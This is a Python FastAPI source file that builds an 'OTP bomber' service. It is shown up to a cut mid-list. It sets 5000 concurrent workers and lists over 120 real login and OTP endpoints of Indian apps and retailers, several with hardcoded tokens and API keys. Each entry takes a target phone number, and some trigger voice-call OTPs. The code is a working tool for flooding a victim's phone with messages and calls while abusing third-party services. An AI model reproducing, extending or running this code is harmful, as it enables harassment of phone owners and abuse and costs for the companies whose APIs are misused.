#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🔥 ULTIMATE OTP BOMBER API v5.0 — ALL-IN-ONE          ║
║   ▸ 120+ APIs (Real + New)                              ║
║   ▸ 5000 Concurrent Workers                             ║
║   ▸ Render / Vercel / Railway Ready                     ║
║   ▸ Netlify Frontend Support                            ║
║   ▸ uvloop + Super Flash                                ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import time
from datetime import datetime
from uuid import uuid4
from collections import defaultdict

import aiohttp
from fastapi import FastAPI, BackgroundTasks, Query
from fastapi.responses import JSONResponse, HTMLResponse
from fastapi.middleware.cors import CORSMiddleware
import uvicorn

try:
    import uvloop
    uvloop.install()
    print("✅ uvloop enabled")
except ImportError:
    print("⚠️  uvloop not installed (optional)")

# ═══════════════════════════════════════════════════════════
# 🚀 APP
# ═══════════════════════════════════════════════════════════
app = FastAPI(title="ULTIMATE OTP BOMBER API v5.0")
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ═══════════════════════════════════════════════════════════
# ⚙️ SETTINGS — SUPER FLASH
# ═══════════════════════════════════════════════════════════
MAX_CONCURRENT  = 5000
BATCH_CHUNK     = 1000
REQUEST_TIMEOUT = 4
CONNECT_TIMEOUT = 2

OTP_KEYWORDS = (
    "success", "sent", "otp", "message", "ok", "true",
    "verified", "delivered", "sent successfully",
)

_running_jobs = {}
_stop_numbers = set()
_global_stats = defaultdict(lambda: {
    "total": 0, "http_ok": 0, "otp_ok": 0, "failed": 0, "start": 0
})

# ═══════════════════════════════════════════════════════════
# 📋 ALL APIS (Old + 16 New) — 120+ ENDPOINTS
# ═══════════════════════════════════════════════════════════
ULTIMATE_APIS = [
    # ══════════════ NEW APIS (16) ══════════════
    {
        "name": "zestmoney",
        "url": "https://authentication.zestmoney.in/v2/mobile/otp/",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "token": "135b043150475d7288b936606e086af5c1fb7f0eff15256748f5ad078ebdcf85",
            "Origin": "https://app.zestmoney.in",
            "Referer": "https://app.zestmoney.in/"
        },
        "data": lambda p: f'{{"MobileNumber":"91{p}","MessageParams":{{"MerchantKey":"null"}}}}'
    },
    {
        "name": "bewakoof",
        "url": "https://api-prod.bewakoof.com/v3/user/auth/login/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "api-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
            "x-client-device-token": "NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
            "x-origin-host": "api-prod.bewakoof.com/v3/user/auth/login/otp",
            "Origin": "https://www.bewakoof.com",
            "Referer": "https://www.bewakoof.com/"
        },
        "data": lambda p: f'{{"mobile":"{p}","country_code":"+91"}}'
    },
    {
        "name": "eurekaforbes",
        "url": "https://www.eurekaforbes.com/api/public/ecom/v1/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/91.0 Mobile Safari/537.36",
            "Content-Type": "application/json"
        },
        "data": lambda p: f'{{"mobile_number":"{p}"}}'
    },
    {
        "name": "bookmyshow",
        "url": "https://in.bookmyshow.com/api/members/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "x-app-code": "WEBV2",
            "x-geohash": "te7",
            "x-region-slug": "mumbai",
            "x-latitude": "19.12175",
            "x-longitude": "72.8504",
            "x-platform-code": "WEBV2",
            "x-region-code": "MUMBAI",
            "Origin": "https://in.bookmyshow.com",
            "Referer": "https://in.bookmyshow.com/login/otp?referer=/my-profile&refresh=true&source=web"
        },
        "data": lambda p: f'{{"channel":"phone","subChannel":"sms","details":{{"phone":"{p}","origin":"https://in.bookmyshow.com","isdCountryCode":"IN","isdCode":"+91"}}}}'
    },
    {
        "name": "pharmeasy_apt",
        "url": "https://pharmeasy.in/apt-api/login/send-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Origin": "https://pharmeasy.in",
            "Referer": "https://pharmeasy.in/"
        },
        "data": lambda p: f'{{"param":"{p}"}}'
    },
    {
        "name": "dailyhunt",
        "url": "https://dailyhunt.in/api/pwa",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": "https://dailyhunt.in",
            "Referer": "https://dailyhunt.in/news/india/english/login/mobile-verification?mode=pwa&onlyLogin=true"
        },
        "data": lambda p: f'{{"method":"POST","body":{{"mobileNo":"91-{p}"}},"url":"http://dh-ugc-users.dailyhunt.in//api/v1/internal/pwa/accounts/generate/otp"}}'
    },
    {
        "name": "cordelia",
        "url": "https://api-pro.cordeliacruises.com/auth/b2c/generate-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://www.cordeliacruises.com",
            "Referer": "https://www.cordeliacruises.com/"
        },
        "data": lambda p: f'{{"phoneNumber":"{p}","countryCode":"+91","website":"https://www.cordeliacruises.com/login","pageCode":"login"}}'
    },
    {
        "name": "urbanladder",
        "url": "https://www.urbanladder.com/api/service/application/user/authentication/v1.0/login/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "authorization": "Bearer NjVmNDM3ZmFlNzg4NTEwMjg3MDdkYWVlOmI0ZEZvd2ZRSw==",
            "Origin": "https://www.urbanladder.com",
            "Referer": "https://www.urbanladder.com/auth/login"
        },
        "data": lambda p: f'{{"mobile":"{p}","country_code":"91","captcha_code":"grimlock_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ0IjoxNzY5NDQwNTQyNjAyfQ.4sY-nJ89czQEY0MYp2hT1sRH0ADY9c1LE-AuC-hIHbY"}}'
    },
    {
        "name": "mamaearth_gokwik",
        "url": "https://gkx.gokwik.co/kp/api/v1/auth/otp/send",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1c2VyLWtleSIsImlhdCI6MTc2OTUyNjQ3MSwiZXhwIjoxNzY5NTI2NTMxfQ.HLM1KyRImw0paDZMBYkFdm-6E1pQco_GitAdrUqrgy8",
            "gk-request-id": "51c1169f-3c41-4b75-ac29-47e1e3b9d25d",
            "kp-request-id": "ad5d18a8-824f-4a47-a5cf-6f732151c2dc",
            "gk-merchant-id": "12wyqc26spoknx0kv7t",
            "Origin": "https://mamaearth.in",
            "Referer": "https://mamaearth.in/"
        },
        "data": lambda p: f'{{"phone":"{p}","country":"in","country_code":"+91"}}'
    },
    {
        "name": "allen",
        "url": "https://api.allen-live.in/api/v1/auth/sendOtp?center_id&source=home-page-login",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "x-device-id": "29eeb510-774d-47e6-9606-19142305f562",
            "x-client-type": "mweb",
            "Origin": "https://allen.in",
            "Referer": "https://allen.in/"
        },
        "data": lambda p: f'{{"country_code":"91","phone_number":"{p}","persona_type":"STUDENT","otp_type":"SHARED_DEFAULT"}}'
    },
    {
        "name": "snapdeal",
        "url": "https://m.snapdeal.com/signupCompleteAjax",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json;charset=UTF-8",
            "Origin": "https://m.snapdeal.com",
            "Referer": "https://m.snapdeal.com/signin"
        },
        "data": lambda p: f'{{"j_password":null,"j_mobilenumber":"{p}","agree":true,"j_confpassword":null,"journey":"mobile","numberEdit":false,"j_fullname":"Guest","swp":true}}'
    },
    {
        "name": "fabindia",
        "url": "https://apisap.fabindia.com/occ/v2/fabindiab2c/otp/generate?lang=en&curr=INR",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "authorization": "bearer yYo1wwUV1B1yUqYeo4YrbKF5WNI",
            "Origin": "https://www.fabindia.com",
            "Referer": "https://www.fabindia.com/"
        },
        "data": lambda p: f'{{"mobileDailCode":"+91","mobileNumber":"{p}","isLogin":false,"isSignUp":false}}'
    },
    {
        "name": "shoppersstop",
        "url": "https://api-sscom-preprod.ssecom.tech/v2/olg/sendOTP",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "Origin": "https://www.shoppersstop.com",
            "Referer": "https://www.shoppersstop.com/"
        },
        "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'
    },
    {
        "name": "olx",
        "url": "https://www.olx.in/api/auth/authenticate?lang=en-IN",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "x-panamera-client-id": "web-mobile",
            "Origin": "https://www.olx.in",
            "Referer": "https://www.olx.in/en-in"
        },
        "data": lambda p: f'{{"grantType":"phone","phone":"+91{p}","language":"en-IN"}}'
    },
    {
        "name": "zepto_v2",
        "url": "https://bff-gateway.zepto.com/api/v1/user/customer/send-otp-sms/",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json; charset=UTF-8",
            "x-csrf-secret": "uD0aoNYI_ZA",
            "platform": "WEB",
            "Origin": "https://www.zepto.com",
            "Referer": "https://www.zepto.com/"
        },
        "data": lambda p: f'{{"mobileNumber":"{p}"}}'
    },
    {
        "name": "aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36",
            "Content-Type": "application/json",
            "x-client-id": "a6fbf1d2-27c3-46e1-b149-0380e506b763",
            "Origin": "https://www.aakash.ac.in",
            "Referer": "https://www.aakash.ac.in/"
        },
        "data": lambda p: f'{{"mobile_psid":"{p}","mobile_number":"","activity_type":"aakash-myadmission","webengageData":{{"profile":"student","whatsapp_opt_in":true,"method":"mobile"}}}}'
    },

    # ══════════════ REAL WORKING (Old) ══════════════
    {"name": "lenskart", "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json", "X-API-Client": "mobilesite", "X-Session-Token": "7836451c-4b02-4a00-bde1-15f7fb50312a", "Origin": "https://www.lenskart.com", "Referer": "https://www.lenskart.com/", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"captcha":null,"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "gopinkcabs", "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"check_mobile_number=1&contact={p}"},
    {"name": "shemaroome", "url": "https://www.shemaroome.com/users/resend_otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "kpnfresh_web", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=WEB&version=1.0.0", "method": "POST", "headers": {"Content-Type": "application/json", "x-channel-id": "WEB", "x-app-id": "d7547338-c70e-4130-82e3-1af74eda6797", "User-Agent": "Mozilla/5.0"}, "data": lambda p: f'{{"phone_number":{{"number":"{p}","country_code":"+91"}}}}'},
    {"name": "kpnfresh_and", "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6", "method": "POST", "headers": {"Content-Type": "application/json", "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f", "User-Agent": "okhttp/5.0.0-alpha.11"}, "data": lambda p: f'{{"notification_channel":"WHATSAPP","phone_number":{{"country_code":"+91","number":"{p}"}}}}'},
    {"name": "bikefixup", "url": "https://api.bikefixup.com/api/v2/send-registration-otp", "method": "POST", "headers": {"Content-Type": "application/json", "client": "app", "User-Agent": "Dart/3.6"}, "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "rappi_wa", "url": "https://services.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json", "Deviceid": "5df83c463f0ff8ff"}, "data": lambda p: f'{{"phone":"{p}","country_code":"+91"}}'},
    {"name": "stratzy_sms", "url": "https://stratzy.in/api/web/auth/sendPhoneOTP", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://stratzy.in", "Referer": "https://stratzy.in/login"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
    {"name": "stratzy_wa", "url": "https://stratzy.in/api/web/whatsapp/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://stratzy.in"}, "data": lambda p: f'{{"phoneNo":"{p}"}}'},
    {"name": "wellacademy", "url": "https://wellacademy.in/store/api/numberLoginV2", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://wellacademy.in"}, "data": lambda p: f'{{"contact_no":"{p}"}}'},
    {"name": "hungama", "url": "https://communication.api.hungama.com/v1/communication/otp", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.hungama.com", "identifier": "home", "country_code": "IN"}, "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","templateCode":1}}'},
    {"name": "servetel", "url": "https://api.servetel.in/v1/auth/otp", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Dalvik/2.1.0"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "merucab", "url": "https://merucabapp.com/api/otp/generate", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9", "User-Agent": "okhttp/4.9.0"}, "data": lambda p: f"mobile_number={p}"},
    {"name": "beepkart", "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.beepkart.com"}, "data": lambda p: f'{{"city":362,"fullName":"","phone":"{p}","source":"myaccount","consent":false}}'},
    {"name": "lendingplate", "url": "https://lendingplate.com/api.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://lendingplate.com"}, "data": lambda p: f"mobiles={p}&resend=Resend&clickcount=3"},
    {"name": "snitch", "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2", "method": "POST", "headers": {"Content-Type": "application/json", "client-id": "snitch_secret", "Origin": "https://www.snitch.com"}, "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "dayco", "url": "https://ekyc.daycoindia.com/api/nscript_functions.php", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://ekyc.daycoindia.com"}, "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "penpencil", "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/3.9.1"}, "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "imaginestore", "url": "https://www.myimaginestore.com/mobilelogin/index/registrationotpsend/", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.myimaginestore.com"}, "data": lambda p: f"mobile={p}"},
    {"name": "nobroker", "url": "https://www.nobroker.in/api/v3/account/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.nobroker.in"}, "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "cossouq", "url": "https://www.cossouq.com/mobilelogin/otp/send", "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded", "Origin": "https://www.cossouq.com"}, "data": lambda p: f"mobilenumber={p}&otptype=register&resendotp=0&email=&oldmobile=0"},
    {"name": "shiprocket", "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "authorization": "Bearer null", "Origin": "https://app.shiprocket.in"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "gokwik", "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send", "method": "POST", "headers": {"Content-Type": "application/json", "gk-version": "20250421065835697", "gk-signature": "076108", "gk-udf-1": "951", "gk-request-id": "a0cecd38-e690-48d5-ab80-b9d2feed3761", "gk-merchant-id": "19g6jlc658iad", "Origin": "https://pdp.gokwik.co"}, "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "jockey_sms", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/send-otp/+91{p}?whatsapp=false", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0", "Referer": "https://www.jockey.in/"}, "data": None},
    {"name": "jockey_wa", "url": lambda p: f"https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{p}?whatsapp=true", "method": "GET", "headers": {"User-Agent": "Mozilla/5.0", "Referer": "https://www.jockey.in/"}, "data": None},
    {"name": "newme", "url": "https://prodapi.newme.asia/web/otp/request", "method": "POST", "headers": {"Content-Type": "application/json", "Caller": "web_app", "Origin": "https://newme.asia"}, "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name": "univest", "url": lambda p: f"https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber={p}", "method": "GET", "headers": {"User-Agent": "okhttp/3.9.1"}, "data": None},
    {"name": "rappi_mx", "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/3.9.1"}, "data": lambda p: f'{{"country_code":"+91","phone":"{p}"}}'},
    {"name": "foxy", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be", "Origin": "https://www.foxy.in"}, "data": lambda p: f'{{"guest_token":"01943c60-aea9-7ddc-b105-e05fbcf832be","user":{{"phone_number":"+91{p}"}},"device":null,"invite_code":""}}'},
    {"name": "foxy_wa", "url": "https://www.foxy.in/api/v2/users/send_otp", "method": "POST", "headers": {"Content-Type": "application/json", "X-Guest-Token": "01943c60-aea9-7ddc-b105-e05fbcf832be", "Origin": "https://www.foxy.in"}, "data": lambda p: f'{{"user":{{"phone_number":"+91{p}"}},"via":"whatsapp"}}'},
    {"name": "eka_care", "url": "https://auth.eka.care/auth/init", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/4.9.3", "Device-Id": "5df83c463f0ff8ff"}, "data": lambda p: f'{{"payload":{{"allowWhatsapp":true,"mobile":"+91{p}"}},"type":"mobile"}}'},
    {"name": "smytten", "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://smytten.com"}, "data": lambda p: f'{{"ad_id":"","device_info":{{}},"device_id":"","device_platform":"web","phone":"{p}","email":"test@test.com"}}'},
    {"name": "wakefit", "url": "https://api.wakefit.co/api/consumer-sms-otp/", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.wakefit.co", "API-Secret-Key": "ycq55IbIjkLb", "API-Token": "c84d563b77441d784dce71323f69eb42"}, "data": lambda p: f'{{"mobile":"{p}","whatsapp_opt_in":1}}'},
    {"name": "caratlane", "url": "https://www.caratlane.com/cg/dhevudu", "method": "POST", "headers": {"Content-Type": "application/json", "Origin": "https://www.caratlane.com", "Authorization": "b945ebaf43ed7541d49cfd60bd82b81908edff8d465caecfe58deef209"}, "data": lambda p: f'{{"query":"mutation {{SendOtp(input: {{mobile: \\"{p}\\", isdCode: \\"91\\", otpType: \\"registerOtp\\"}}) {{status {{message code}}}}}}"}}'},

    # ══════════════ BULK APIs ══════════════
    {"name": "1mg_1", "url": "https://1mg.com/auth_api/v6/create_token", "method": "POST", "headers": {"Content-Type": "application/json", "User-Agent": "okhttp/3.9.1"}, "data": lambda p: f'{{"number":"{p}","is_corporate_user":false,"otp_on_call":true}}'},
    {"name": "ajio_1", "url": "https://ajio.com/api/v2/otpgenerate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'},
    {"name": "amazon_1", "url": "https://amazon.in/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "bigbasket_1", "url": "https://bigbasket.com/api/v1/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "blinkit_1", "url": "https://blinkit.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "cred_1", "url": "https://cred.club/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'},
    {"name": "doubtnut_1", "url": "https://doubtnut.com/api/v2/otpgenerate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "flipkart_1", "url": "https://flipkart.com/api/v2/otpgenerate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "goibibo_1", "url": "https://goibibo.com/api/v2/login/sendotp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "khatabook_1", "url": "https://khatabook.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "meesho_1", "url": "https://meesho.com/gw/login-register/v1/sendOTP", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "myntra_1", "url": "https://myntra.com/api/v2/otpgenerate", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "nykaa_1", "url": "https://nykaa.com/api/v3/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "olacabs_1", "url": "https://olacabs.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'},
    {"name": "oyorooms_1", "url": "https://oyorooms.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phoneNumber":"{p}","otpType":"voice"}}'},
    {"name": "paytm_1", "url": "https://paytm.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "pharmeasy_1", "url": "https://pharmeasy.in/api/v1/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "phonepe_1", "url": "https://phonepe.com/api/v1/auth/otpsend", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "pokerbaazi_1", "url": "https://pokerbaazi.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "rapido_1", "url": "https://rapido.bike/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "shiprocket_2", "url": "https://shiprocket.in/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "swiggy_1", "url": "https://swiggy.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "tatacapital_1", "url": "https://tatacapital.com/v1/user/otplogin", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "uber_1", "url": "https://uber.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "wakefit_2", "url": "https://wakefit.co/api/v3/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},
    {"name": "zepto_1", "url": "https://zepto.com/api/v3/user/otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"phone":"{p}","countryCode":"91"}}'},
    {"name": "zivame_1", "url": "https://zivame.com/api/v1/customers/sendOtp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "zomato_1", "url": "https://zomato.com/api/v2/auth/send-otp", "method": "POST", "headers": {"Content-Type": "application/json"}, "data": lambda p: f'{{"number":"{p}","otpOnCall":true}}'},

    # ═══════════════════════════════════════════════════════════
    # 🆕 ADDED APIS FROM USER PROVIDED CODE
    # ═══════════════════════════════════════════════════════════

    # ─── From first code block (sync def send_otp_requests) ───
    {
        "name": "hungama_1",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "headers": {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "identifier": "home",
            "country_code": "IN"
        },
        "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","emailId":"","subject":"Register","priority":"1","device":"web","variant":"v1","templateCode":1}}'
    },
    {
        "name": "merucab_1",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "headers": {
            "Mobilenumber": "{phone}",
            "Mid": "287187234baee1714faa43f25bdf851b3eff3fa9fbdc90d1d249bd03898e3fd9",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "okhttp/4.9.0"
        },
        "data": lambda p: f"mobile_number={p}"
    },
    {
        "name": "dayco_1",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "headers": {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "X-Requested-With": "XMLHttpRequest",
            "Origin": "https://ekyc.daycoindia.com"
        },
        "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"
    },
    {
        "name": "doubtnut_2",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "headers": {
            "version_code": "1160",
            "has_upi": "false",
            "device_model": "ASUS_I005DA",
            "android_sdk_version": "28",
            "content-type": "application/json; charset=utf-8",
            "user-agent": "okhttp/5.0.0-alpha.2"
        },
